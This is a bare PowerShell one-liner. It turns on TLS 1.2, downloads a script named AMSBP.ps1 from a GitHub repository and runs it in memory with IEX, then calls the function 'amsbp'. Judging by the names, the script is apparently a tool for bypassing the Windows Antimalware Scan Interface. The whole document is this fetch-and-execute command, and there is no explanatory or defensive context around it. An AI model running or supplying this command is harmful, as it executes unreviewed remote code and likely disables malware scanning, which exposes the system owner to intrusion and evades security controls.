[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12;
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/ShorSec/AMS-BP/master/AMSBP.ps1');
amsbp;

